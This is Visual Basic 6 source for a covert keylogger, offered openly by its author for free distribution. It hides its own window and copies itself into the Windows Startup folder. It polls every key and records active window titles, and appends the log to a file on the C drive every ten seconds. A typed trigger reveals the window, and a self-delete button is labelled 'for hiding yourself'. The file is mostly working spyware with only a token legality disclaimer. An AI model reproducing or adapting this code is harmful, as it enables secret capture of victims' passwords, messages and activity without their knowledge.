VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmkeylogge 
   BackColor       =   &H00000000&
   Caption         =   "KeyLogger"
   ClientHeight    =   6540
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   6780
   Icon            =   "frmkeylogge.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   6540
   ScaleWidth      =   6780
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.TextBox Text2 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   2895
      Left            =   240
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   12
      Top             =   3120
      Visible         =   0   'False
      Width           =   6255
   End
   Begin VB.Timer Timer2 
      Interval        =   10000
      Left            =   6120
      Top             =   480
   End
   Begin MSComDlg.CommonDialog cd1 
      Left            =   600
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Timer Timer1 
      Interval        =   10
      Left            =   0
      Top             =   120
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   2895
      Left            =   240
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   3120
      Width           =   6255
   End
   Begin VB.Label Label8 
      BackColor       =   &H0000FF00&
      Caption         =   "CLICK HERE TO VIEW ALL DETAILS "
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   240
      TabIndex        =   11
      Top             =   2880
      Width           =   6255
   End
   Begin VB.Label cmdsave 
      BackColor       =   &H0000FF00&
      Caption         =   "   SAVE"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF0000&
      Height          =   255
      Left            =   3120
      TabIndex        =   10
      Top             =   6240
      Width           =   1095
   End
   Begin VB.Label cmdclear 
      BackColor       =   &H0000FF00&
      Caption         =   "   CLEAR"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF0000&
      Height          =   255
      Left            =   1680
      TabIndex        =   9
      ToolTipText     =   "clear the screen"
      Top             =   6240
      Width           =   1215
   End
   Begin VB.Label Label7 
      BackColor       =   &H0000FF00&
      Caption         =   "  KILL ME"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF0000&
      Height          =   255
      Left            =   120
      TabIndex        =   8
      ToolTipText     =   "delete the exe..of this program..for hiding yourself"
      Top             =   6240
      Width           =   1335
   End
   Begin VB.Label Label6 
      BackStyle       =   0  'Transparent
      Caption         =   $"frmkeylogge.frx":030A
      BeginProperty Font 
         Name            =   "Courier"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   2535
      Left            =   240
      TabIndex        =   7
      Top             =   480
      Width           =   6255
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   $"frmkeylogge.frx":0503
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C0C0FF&
      Height          =   2055
      Left            =   6840
      TabIndex        =   6
      Top             =   4080
      Width           =   4215
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   $"frmkeylogge.frx":063C
      BeginProperty Font 
         Name            =   "Courier"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000C0C0&
      Height          =   3735
      Left            =   6840
      TabIndex        =   5
      Top             =   480
      Width           =   4095
   End
   Begin VB.Label Label3 
      BackColor       =   &H0000FF00&
      Caption         =   "CONTRACT"
      BeginProperty Font 
         Name            =   "Courier"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C00000&
      Height          =   255
      Left            =   9960
      TabIndex        =   4
      Top             =   120
      Width           =   1215
   End
   Begin VB.Label cmdhelp 
      BackColor       =   &H0000FF00&
      Caption         =   "  H E L P"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C00000&
      Height          =   255
      Left            =   5280
      TabIndex        =   3
      ToolTipText     =   "help..how to use."
      Top             =   6240
      Width           =   1335
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Quick keylogger"
      BeginProperty Font 
         Name            =   "Courier"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   2160
      TabIndex        =   2
      Top             =   360
      Width           =   3015
   End
   Begin VB.Line Line1 
      BorderColor     =   &H0000FF00&
      X1              =   240
      X2              =   6240
      Y1              =   360
      Y2              =   360
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "K E Y L O G G E R"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   20.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   1080
      TabIndex        =   1
      Top             =   0
      Width           =   4815
   End
   Begin VB.Shape Shape1 
      BackColor       =   &H00000000&
      BackStyle       =   1  'Opaque
      BorderColor     =   &H00000000&
      DrawMode        =   7  'Invert
      FillColor       =   &H000000FF&
      FillStyle       =   3  'Vertical Line
      Height          =   6135
      Left            =   0
      Top             =   0
      Width           =   6735
   End
End
Attribute VB_Name = "frmkeylogge"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32.dll" () As Long

'Programmed by Somdutt Ganguly
'Keylogger:.....
'contact: gangulysomdutt@yahoo.com
'no 6, chandrodaya apt,
'bhaikaka nagar, thaltej
'ahmedabad
'gujarat
'india
'don't use this tool...for any illegal purpose
'i am not responsible for any ...
'damage whatsoever in your computer after using it
'use this tool freely..and distribute it..but don't remove
'my name...
Dim mastervariable As String
Dim returnvalue As String
Dim previousvalue As String
Private Sub cmdclear_Click()
Text1.Text = ""

End Sub

Private Sub cmdclear_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdclear.BackColor = vbRed
End Sub

Private Sub cmdhelp_Click()
While Me.Width <> 11550
Me.Width = Me.Width + 1
Wend
End Sub



Private Sub cmdhelp_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdhelp.BackColor = vbRed

End Sub

Private Sub cmdsave_Click()
On Error GoTo Errhandler:
cd1.ShowSave

Open cd1.FileName For Output As #1

 Print #1, Text1.Text
 
 Close #1
 

 Exit Sub
Errhandler:
   MsgBox "error occured"

End Sub



Private Sub cmdsave_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdsave.BackColor = vbRed

End Sub





Private Sub Form_Load()
On Error GoTo error
FileCopy App.Path & "\" & App.EXEName & ".EXE", Mid$(App.Path, 1, 3) & "WINDOWS\START MENU\PROGRAMS\STARTUP\" & App.EXEName & ".EXE"
Exit Sub
error:
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdhelp.BackColor = &HFF00&
cmdsave.BackColor = &HFF00&
cmdclear.BackColor = &HFF00&
Label7.BackColor = &HFF00&
Label8.BackColor = &HFF00&
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
Open "c:\keysom" For Append As #1
Print #1, Text1.Text
Close #1
End Sub

Private Sub Label3_Click()
While Me.Width <> 6900
Me.Width = Me.Width - 1
Wend
End Sub



Private Sub Label6_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdhelp.BackColor = &HFF00&
cmdsave.BackColor = &HFF00&
cmdclear.BackColor = &HFF00&
Label7.BackColor = &HFF00&
Label8.BackColor = &HFF00&
End Sub

Private Sub Label7_Click()
Kill App.Path & "\" & App.EXEName & ".exe"
End Sub

Private Sub Label7_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label7.BackColor = vbRed

End Sub

Private Sub Label8_Click()
Text2.Visible = True
Text2.Text = mastervariable
End Sub

Private Sub Label8_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label8.BackColor = vbRed
End Sub



Private Sub Timer1_Timer()
Label2.ForeColor = &HFF00&

DoEvents

On Error Resume Next
For i = 32 To 256
X = GetAsyncKeyState(i)
If X = -32767 Then
If Chr(i) >= 0 And Chr(i) <= 9 Then
Text1.ForeColor = vbRed
Text1.Text = Text1.Text + Chr(i)
ElseIf i = 38 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<up>"
ElseIf i = 40 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<down>"
ElseIf i = 37 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<left>"
ElseIf i = 39 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<right>"
ElseIf i = 190 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "."
ElseIf i = 188 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & ","
ElseIf i = 189 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "-"
ElseIf i = 186 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & ";"
ElseIf i = 221 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "]"
ElseIf i = 219 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "["
ElseIf i = 220 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "\"
ElseIf i = 187 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "="
ElseIf i = 46 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<delete>"
ElseIf i = 45 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<insert>"
ElseIf i = 33 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<pagedown>"
ElseIf i = 34 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<pagedown>"
ElseIf i = 36 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<home>"
ElseIf i = 35 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<end>"
ElseIf i = 192 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "`"
ElseIf i = 112 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<f1>"
ElseIf i = 113 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<f2>"
ElseIf i = 114 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<f3>"
ElseIf i = 115 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<f4>"
ElseIf i = 116 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<f5>"
ElseIf i = 117 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<f6>"
ElseIf i = 118 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<f7>"
ElseIf i = 119 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<f8>"
ElseIf i = 120 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<f9>"
ElseIf i = 121 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<f10>"
ElseIf i = 122 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<f11>"
ElseIf i = 123 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<f12>"
ElseIf i = 44 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<printscreen>"
ElseIf i = 145 Then
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text & "<scroll lock>"

Else
Text1.ForeColor = &HFF00&
Text1.Text = Text1.Text + Chr(i)
End If
End If
Next
returnvalue = GetCaption(GetForegroundWindow)
If returnvalue = previousvalue Then
previousvalue = returnvalue
Else
previousvalue = returnvalue
Text1.Text = Text1.Text & vbCrLf & returnvalue
End If
On Error Resume Next
If Right(Text1.Text, 17) = "KEYLOGGERCOMPLETE" Then
frmkeylogge.Visible = True
End If
On Error Resume Next
If Right(Text1.Text, 14) = "KEYLOGGERSTART" Then
Text2.Visible = False
frmkeylogge.Visible = False
End If


End Sub

Private Sub Text1_KeyPress(KeyAscii As Integer)
KeyAscii = 0

End Sub
Private Sub Text2_KeyPress(KeyAscii As Integer)
KeyAscii = 0

End Sub

Private Sub Timer2_Timer()
Label2.ForeColor = vbRed

mastervariable = mastervariable & Text1.Text
'save the contents to a file called keysom in c drive
'u can open the keysom .. by opening it with notepad
On Error Resume Next
Open "c:\keysom" For Append As #1
Print #1, Text1.Text
Close #1
Text1.Text = ""
End Sub

Function GetCaption(hWnd As Long)
Dim hWndTitle As String
hWndTitle = String(GetWindowTextLength(hWnd), 0)
GetWindowText hWnd, hWndTitle, (GetWindowTextLength(hWnd) + 1)
GetCaption = hWndTitle
End Function
